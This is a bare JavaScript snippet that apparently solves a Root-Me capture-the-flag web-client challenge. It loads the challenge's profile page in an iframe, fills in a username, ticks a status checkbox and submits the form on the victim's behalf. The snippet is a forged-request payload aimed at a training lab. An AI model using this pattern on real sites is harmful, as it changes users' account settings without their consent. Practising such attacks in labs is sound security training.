const ifr = document.querySelector("#principalIframe");
ifr.src = "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"

ifr.contentDocument.querySelector("#username").value = "test1"
ifr.contentDocument.querySelector("#status").checked = true

ifr.contentDocument.forms[0].submit()




